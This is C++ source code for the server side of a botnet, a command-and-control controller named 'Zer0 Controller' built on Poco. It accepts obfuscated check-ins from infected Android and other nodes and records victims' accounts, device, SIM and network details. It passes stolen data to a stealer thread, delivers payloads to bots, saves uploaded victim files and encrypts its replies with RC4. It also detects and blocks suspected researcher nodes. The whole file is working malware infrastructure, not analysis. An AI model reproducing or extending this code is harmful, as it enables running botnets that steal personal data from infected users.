        bool bSendDefault = true;
        std::string outData;
        Poco::UInt32 dataSize;
        Poco::UInt32 requestHash;
        Poco::Util::Application& app = Poco::Util::Application::instance();
        std::string reqData;
        Zer0Stream outStream;
		Poco::Data::Session dbSession = _pGlobals->_pMysqlPool->get();

        _query = (char*)_pGlobals->_pQueryPool->get();

        try {
#ifndef _DEBUG
			_sBotIp = request.get("X-Real-IP");
#else
			_sBotIp = request.clientAddress().host().toString();
#endif // _DEBUG

            //std::cout << "IP: " << request.get("X-Real-IP", "nope") << std::endl;
            //std::string ct = request.get("Content-Type");

            //Poco::Net::NameValueCollection::ConstIterator it = request.begin();
            //Poco::Net::NameValueCollection::ConstIterator end = request.end();
            //for (; it != end; ++it) {
            //    std::cout << it->first << ": " << it->second << "\n";
            //}
            if (request.getMethod() != Poco::Net::HTTPRequest::HTTP_POST) {
                throw Poco::DataFormatException("Bad HTTP method: " + request.getMethod());
            }
            else if (request.get("Content-Type").find("multipart/form-data; boundary=") == std::string::npos) {
                throw Poco::DataFormatException("Bad Content-Type:" + request.get("Content-Type"));
            }
            /*else if (!request.has("Referer")) {
                throw Poco::DataFormatException("Request without Referer");
            }*/
#ifndef _DEBUG
            else if (!request.has("X-Real-IP")) {
                throw Poco::DataFormatException("Request without X-Real-IP");
            }
#endif // _DEBUG

			Poco::UInt32 buildId = 0, subId = 0;
			
			if (request.has("Referer")) {
				Poco::URI refURI(request.get("Referer"));
				std::string refererQuery = refURI.getQuery();
				if (refererQuery.empty()) {
					throw Poco::DataFormatException("No query in refferer URI");
				}

				if (!Poco::NumberParser::tryParseUnsigned(MsgObf::deobfuscateFromQuery(refererQuery), dataSize)) {
					throw Poco::DataFormatException("Cannot determine data size");
				}
				if (!Poco::NumberParser::tryParseUnsigned(MsgObf::deobfuscateFromDomain(refURI.getHost()), requestHash)) {
					throw Poco::DataFormatException("Cannot determine request hash");
				}
			}
			else if (request.has("Cookie")) {
				std::string cookie = request.get("Cookie");
				Poco::StringTokenizer ssidParts(cookie, "=", Poco::StringTokenizer::TOK_TRIM | Poco::StringTokenizer::TOK_IGNORE_EMPTY);
				if (ssidParts.count() != 2 || ssidParts[0] != "sid" || ssidParts[1].length() != 32) {
					throw Poco::DataFormatException("Cookie without sid parameter");
				}
				//00000000000000000000000000000000
				std::string sid = ssidParts[1];
				sid.insert(24, ".");
				sid.insert(16, ".");
				sid.insert(8, ".");
				Poco::StringTokenizer nodeBaseInfo(sid, ".", Poco::StringTokenizer::TOK_TRIM | Poco::StringTokenizer::TOK_IGNORE_EMPTY);

				if (!Poco::NumberParser::tryParseHex(nodeBaseInfo[0], requestHash)) {
					throw Poco::DataFormatException("Cannot determine request hash");
				}
				if (!Poco::NumberParser::tryParseHex(nodeBaseInfo[1], dataSize)) {
					throw Poco::DataFormatException("Cannot determine data size");
				}
				buildId = Poco::NumberParser::parseHex(nodeBaseInfo[2]);
				subId = Poco::NumberParser::parseHex(nodeBaseInfo[3]);
			}
			else {
				throw Poco::DataFormatException("Request without Referer and Cookie parameter");
			}

			bool compressed = true;
			Zer0PartHandler partHandler(buildId, dataSize, compressed);
            Poco::Net::HTMLForm form(request, request.stream(), partHandler);

            Zer0Stream& nodeStream = partHandler._zer0Stream;

            if (dataSize != nodeStream.size()) {
                throw Poco::DataFormatException("Data size not equal with received buffer size");
            }

            if (!nodeStream.checkCrc64()) {
                throw Poco::DataFormatException("Incorrect crc64");
            }

            _botIp = Poco::ByteOrder::flipBytes((Poco::UInt32)inet_addr(_sBotIp.c_str()));

            // ��������� ����� ��� ���� �������� ����.
            //Poco::MemoryInputStream memStream((char*)dataBuffer, dataSize);
            Poco::UInt32 inDataSizeValue, inDataRequestHash;
//            inDataSizeValue = nodeStream.readDword();
//
//            if (inDataSizeValue != dataSize) {
//                throw Poco::DataFormatException("Data size in data block not equal HTTP data size");
//            }

            inDataRequestHash = nodeStream.readDword();
            if (inDataRequestHash != requestHash) {
                throw Poco::DataFormatException("Request hash in data block not equal HTTP request hash");
            }

            _buildId = nodeStream.readDword();
            _subId = nodeStream.readDword();
            _platformId = nodeStream.readDword();

			if (_platformId == PLATFORM_ANDROID && (_buildId == 1 || _buildId >= 9)) {
				_coreVersion = nodeStream.readDword();
			}

            inDataSizeValue = nodeStream.readDword(); // ������ ������ ��� botId.
            if (inDataSizeValue != 64) {
                throw Poco::DataFormatException("Incorrect in data botId size");
            }

            _botId.resize(inDataSizeValue);
            nodeStream.read((Poco::UInt8*)&_botId[0], inDataSizeValue);

            _timenow = (Poco::UInt32)time(NULL);

            // ����������� ������ � ���� �� ��.
#ifdef _WIN32
            _snprintf(_query, 1024,
#else
            snprintf(_query, 1024,
#endif // _WIN32
                "SELECT node_id,token,os_id,os_lang_id,country_id,create_tm,sec_mask,hips_mask FROM nodes WHERE uniqid='%.64s'",
                _botId.c_str());

            dbSession << _query,
                Poco::Data::Keywords::into(_dbNodeId),
                Poco::Data::Keywords::into(_dbNToken),
                //Poco::Data::Keywords::into(_dbCoreVersion),
                Poco::Data::Keywords::into(_dbOsId),
                Poco::Data::Keywords::into(_dbOsLang),
                Poco::Data::Keywords::into(_dbCountryId),
                Poco::Data::Keywords::into(_dbCreateTm),
                Poco::Data::Keywords::into(_dbSecMask),
                Poco::Data::Keywords::into(_dbHipsMask),
                Poco::Data::Keywords::now;

			if (_dbNodeId != 0) {
				std::string blockedIp, blockedTrackInfo;
				Poco::UInt32 blockedTm = 0;

				Poco::Data::Statement blockedStmt(dbSession);
				blockedStmt << "SELECT ip,tm,trackinfo FROM blocked_nodes WHERE node_id=?", Poco::Data::Keywords::into(blockedIp), Poco::Data::Keywords::into(blockedTm), Poco::Data::Keywords::into(blockedTrackInfo), Poco::Data::Keywords::use(_dbNodeId);
				blockedStmt.execute();

				if (blockedTm != 0 && blockedIp != "") {
					std::stringstream ss;
					ss << "Blocked node '" << _dbNodeId << "' requested from " << blockedIp << " (build: " << _buildId << "." << _subId << ", request_hash: " << requestHash << ", trakinfo: " << blockedTrackInfo << ")";
					throw Poco::InvalidAccessException(ss.str());
				}
			}

            if (requestHash == REQUEST_COMMON) {
                _osId = nodeStream.readDword();
                _osLang = nodeStream.readDword();
                _secMask = nodeStream.readDword();
                _hipsMask = nodeStream.readQword();
				_account = nodeStream.readBinaryString();
				_manufacturer = nodeStream.readBinaryString();
				_model = nodeStream.readBinaryString();
				_networkOperator = nodeStream.readBinaryString();
				_networkType = nodeStream.readBinaryString();
				_networkCountry = nodeStream.readBinaryString();
				_simState = nodeStream.readBinaryString();

                Poco::UInt32 modulesCount = nodeStream.readDword();
                for (Poco::UInt32 i = 0; i < modulesCount; ++i) {
                    Poco::UInt32 moduleHash = nodeStream.readDword();
                    Poco::UInt32 moduleVer = nodeStream.readDword();
                    Poco::UInt32 moduleStatus = nodeStream.readDword();
                    _modules.push_back(ModuleInfo(0, moduleHash, moduleVer, moduleStatus));
                }

				_trackInfo = nodeStream.readBinaryString();

#ifndef _DEBUG
#ifdef _WIN32
                _snprintf(_query, 1024,
#else
                snprintf(_query, 1024,
#endif // _WIN32
                    "SELECT country_id FROM countries WHERE cc='%.2s'",
                    request.get("X-Country", "UU").c_str());

                dbSession << _query,
                    Poco::Data::Keywords::into(_countryId),
                    Poco::Data::Keywords::now;
#else
                _countryId = 193;
#endif // _DEBUG

				Poco::UInt64 blockedNodeId = 0;
				Poco::Data::Statement sameTrkiStmt(dbSession);
				if (_dbNodeId != 0) {
					sameTrkiStmt << "SELECT node_id FROM nodes WHERE trackinfo=? AND node_id<>? LIMIT 1", Poco::Data::Keywords::into(blockedNodeId), Poco::Data::Keywords::use(_trackInfo), Poco::Data::Keywords::use(_dbNodeId);
				}
				else {
					sameTrkiStmt << "SELECT node_id FROM nodes WHERE trackinfo=? LIMIT 1", Poco::Data::Keywords::into(blockedNodeId), Poco::Data::Keywords::use(_trackInfo);
				}
				sameTrkiStmt.execute();
				if (blockedNodeId != 0) {
					Poco::Data::Statement trkInfoInsStmt(dbSession);
					trkInfoInsStmt << "INSERT INTO blocked_nodes SET node_id=?,tm=UNIX_TIMESTAMP(),ip=?,trackinfo=? ON DUPLICATE KEY UPDATE tm=UNIX_TIMESTAMP(),ip=?,trackinfo=?", Poco::Data::Keywords::use(blockedNodeId), Poco::Data::Keywords::use(_sBotIp), Poco::Data::Keywords::use(_trackInfo), Poco::Data::Keywords::use(_sBotIp), Poco::Data::Keywords::use(_trackInfo);
					trkInfoInsStmt.execute();
				}

                updateInfo(dbSession, outStream);
            }
            else if (requestHash == REQUEST_STEALER) {
                StealerThread::getInstance()->processRequest(_dbNodeId, _buildId, _subId, _platformId, _timenow, nodeStream, outStream);
            }
			else if (requestHash == REQUEST_PAYLOAD) {
				Poco::UInt32 dbPayloadHash = 0, payloadHash = nodeStream.readDword();
				Poco::UInt64 payloadCRC64 = nodeStream.readQword();

#ifdef _WIN32
				_snprintf(_query, 1024,
#else
				snprintf(_query, 1024,
#endif // _WIN32
					"SELECT name_hash FROM payloads WHERE name_hash=%u",
					payloadHash);

				dbSession << _query, Poco::Data::Keywords::into(dbPayloadHash), Poco::Data::Keywords::now;

				PayloadsManager::ZPayload* pPayload = PayloadsManager::getInstance()->getPayload(payloadHash);
				if (pPayload != 0 && payloadHash == dbPayloadHash && pPayload->first != payloadCRC64) {
					outStream.writeDword(pPayload->second->size());
					if (_coreVersion >= 0x00000240) {
						outStream.writeQword(pPayload->first);
					}
					outStream.write(pPayload->second->begin(), pPayload->second->size());

#ifdef _WIN32
					_snprintf(_query, 1024,
#else
					snprintf(_query, 1024,
#endif // _WIN32
						"UPDATE payloads SET downloads=downloads+1 WHERE name_hash=%u",
						payloadHash);
					dbSession << _query, Poco::Data::Keywords::now;
				}
				else {
					outStream.writeDword(0);
					if (_coreVersion >= 0x00000240) {
						outStream.writeQword(payloadCRC64);
					}
				}
			}
			else if (requestHash == REQUEST_UPLOAD_DATA) {
				std::string subDirName = nodeStream.readBinaryString();
				Poco::UInt32 numOfFiles = nodeStream.readDword();
				Poco::Path path(_pGlobals->_nodesPath);
				path.append(Poco::NumberFormatter::format(_dbNodeId)).append(subDirName);
				Poco::File pathFile(path.toString());
				if (!pathFile.exists()) {
					pathFile.createDirectories();
				}
				for (Poco::UInt32 i = 0; i < numOfFiles; ++i) {
					std::string fName = nodeStream.readBinaryString();
					std::string data = nodeStream.readBinaryString();
					Poco::Path fPath(path);
					fPath.append(fName);
					Poco::File f(fPath.toString());
					_pGlobals->saveFile(f.path(), data);
				}
			}

			outStream.writeCrc64();

            Poco::UInt32 streamSize = outStream.size();

            // 31bit - indicates compression
            // 30bit - indicates encryption
            // 0..29bit - indicates real data size
#define COMPRESSION_FLAG 0x80000000
#define ENCRYPTION_FLAG 0x40000000
            Poco::UInt32 flags = ENCRYPTION_FLAG | (streamSize & 0x3FFFFFFF);
			if (compressed && streamSize > 1024) {
				flags |= COMPRESSION_FLAG;

                CLzmaEncProps props;
                Poco::UInt32 outSize;
                Poco::UInt8* outBuffer;
                unsigned propsSize = LZMA_PROPS_SIZE;

                // ������� ������.
                outSize = streamSize + streamSize / 3 + 128 - LZMA_PROPS_SIZE;

                LzmaEncProps_Init(&props);
                props.dictSize = 1048576; // 1 MB
                outBuffer = new Poco::UInt8[outSize];

                int ret = (lzmaEncode(&outBuffer[LZMA_PROPS_SIZE], (size_t*)&outSize, (const Poco::UInt8*)outStream.begin(), (size_t)streamSize, &props, outBuffer, (size_t*)&propsSize, 1) == SZ_OK);
                if (!ret) {
                    throw Poco::RuntimeException("Cannot compress output buffer (size: " + Poco::NumberFormatter::format(streamSize) + ")");
                }

                outStream.clear();
                outStream.write(outBuffer, outSize + propsSize);
                delete[] outBuffer;
            }

            ZBuffer* pZtable = Globals::getInstance()->getZtableForId(_buildId);
            if (pZtable == 0) {
                throw Poco::DataFormatException("Ztable not found for ID: " + Poco::NumberFormatter::format(_buildId));
            }

            Globals::arc4(outStream.begin(), outStream.size(), pZtable->begin(), pZtable->size());

            response.setContentType("application/octet-stream");
            response.setContentLength(outStream.size() + sizeof(Poco::UInt32));

            std::ostream& ostr = response.send();
            ostr.write((const char*)&flags, sizeof(flags));
            ostr.write((const char*)outStream.begin(), outStream.size());

            bSendDefault = false;
			app.logger().information(_sBotIp + " - " + Poco::NumberFormatter::formatHex(requestHash, true) + " - OK");
        }
        catch (Poco::Exception& exc) {
			std::string msg = exc.displayText();
			app.logger().error(_sBotIp + " - " +Poco::NumberFormatter::formatHex(requestHash, true) + " - " + msg);
			logFailedRequest(dbSession, msg, request);
        }

        _pGlobals->_pQueryPool->release(_query);

        if (bSendDefault) {
            response.setStatusAndReason(Poco::Net::HTTPResponse::HTTP_NOT_FOUND);
            response.send();
        }
    }

private:
    Globals* _pGlobals;
    Poco::UInt32 _timenow;
    std::string _format;
    std::string _botId;
    Poco::UInt32 _botIp;
    std::string _sBotIp;
    Poco::UInt32 _coreVersion;
    Poco::UInt32 _buildId;
    Poco::UInt32 _subId;
    Poco::UInt32 _platformId;
    Poco::UInt32 _osId;
    Poco::UInt32 _osLang;
    Poco::UInt32 _secMask;
    Poco::UInt64 _hipsMask;
	std::string _account;
	std::string _manufacturer;
	std::string _model;
	std::string _networkOperator;
	std::string _networkType;
	std::string _networkCountry;
	std::string _simState;
	std::string _trackInfo;
    Poco::UInt32 _countryId;
    char* _query;


    std::string _country;
    std::string _countryCode;

    std::vector<ModuleInfo> _modules;

    Poco::UInt64 _dbNodeId;
    std::string _dbNToken;
    //Poco::UInt32 _dbCoreVersion;
    Poco::UInt32 _dbCountryId;
    Poco::UInt32 _dbCreateTm;
    std::string _dbRegion;
    Poco::UInt32 _dbOsLang;
    Poco::UInt32 _dbOsId;
    std::string _dbCity;
    std::string _dbZip;
    std::string _dbIsp;
    std::string _dbOrg;
    Poco::UInt32 _dbSecMask;
    Poco::UInt64 _dbHipsMask;
	std::string _dbTrackInfo;
};


class ZRequestHandlerFactory : public Poco::Net::HTTPRequestHandlerFactory
{
public:
    ZRequestHandlerFactory()
    {
    }

    Poco::Net::HTTPRequestHandler* createRequestHandler(const Poco::Net::HTTPServerRequest& request)
    {
        return new ZRequestHandler();
    }
};


class ZServer : public Poco::Util::ServerApplication
{
public:
    ZServer() :
    _helpRequested(false)
    {
    }

    ~ZServer()
    {
    }

protected:
    void initialize(Application& self)
    {
        loadConfiguration(); // load default configuration files, if present
        ServerApplication::initialize(self);
    }

    void uninitialize()
    {
        ServerApplication::uninitialize();
    }

    void defineOptions(Poco::Util::OptionSet& options)
    {
        ServerApplication::defineOptions(options);

        options.addOption(
            Poco::Util::Option("help", "h", "display help information on command line arguments")
            .required(false)
            .repeatable(false));
    }

    void handleOption(const std::string& name, const std::string& value)
    {
        ServerApplication::handleOption(name, value);

        if (name == "help") {
            _helpRequested = true;
        }
    }

    void displayHelp()
    {
        Poco::Util::HelpFormatter helpFormatter(options());
        helpFormatter.setCommand(commandName());
        helpFormatter.setUsage("OPTIONS");
        helpFormatter.setHeader("Zer0 Controller v0.7.71");
        helpFormatter.format(std::cout);
    }

    //void displayVersions(std::string version)
    //{
    //    Poco::UInt32 osValue = 0x08000000;
    //    static int shifts[3] = { 16, 12, 8 };
    //    Poco::StringTokenizer parts(version, ".");
    //    for (int i = 0; i < 3; ++i) {
    //        Poco::UInt32 numVal = (Poco::UInt32)Poco::NumberParser::parseUnsigned(parts[i]);
    //        osValue |= (numVal << shifts[i]);
    //    }
    //    std::cout << "(" << Poco::NumberFormatter::format(osValue) << ", 'Android " << version << "')," << std::endl;
    //}

    int main(const std::vector<std::string>& args)
    {
        if (_helpRequested) {
            displayHelp();
        }
        else {
            // get parameters from configuration file
            std::string bindAddr = config().getString("server.addr", "0.0.0.0");
            unsigned short bindPort = (unsigned short)config().getInt("server.port", 8080);
            int maxQueued = config().getInt("server.maxQueued", 1024);
            int maxThreads = config().getInt("server.maxThreads", 1024);
            Poco::ThreadPool::defaultPool().addCapacity(maxThreads);

            Globals::getInstance()->init(config());
			PayloadsManager::getInstance()->init();
			StealerThread::getInstance()->start();
			PostbackThread::getInstance()->start();

            {
                Poco::Net::HTTPServerParams* pParams = new Poco::Net::HTTPServerParams;
                pParams->setKeepAlive(false);
                pParams->setMaxQueued(maxQueued);
                pParams->setMaxThreads(maxThreads);

                // set-up a server socket
                Poco::Net::SocketAddress sockAddr(bindAddr, bindPort);
                Poco::Net::ServerSocket svs(sockAddr, 512);
                // set-up a HTTPServer instance
                Poco::Net::HTTPServer srv(new ZRequestHandlerFactory(), svs, pParams);
                // start the HTTPServer
                srv.start();
                // wait for CTRL-C or kill
                waitForTerminationRequest();
                // Stop the HTTPServer
                srv.stop();
            }

            StealerThread::getInstance()->stop();
			PostbackThread::getInstance()->stop();
        }
        return Poco::Util::Application::EXIT_OK;
    }

private:
    bool _helpRequested;
};

}

int main(int argc, char** argv)
{
    zer0ctrl::ZServer app;
    return app.run(argc, argv);
}
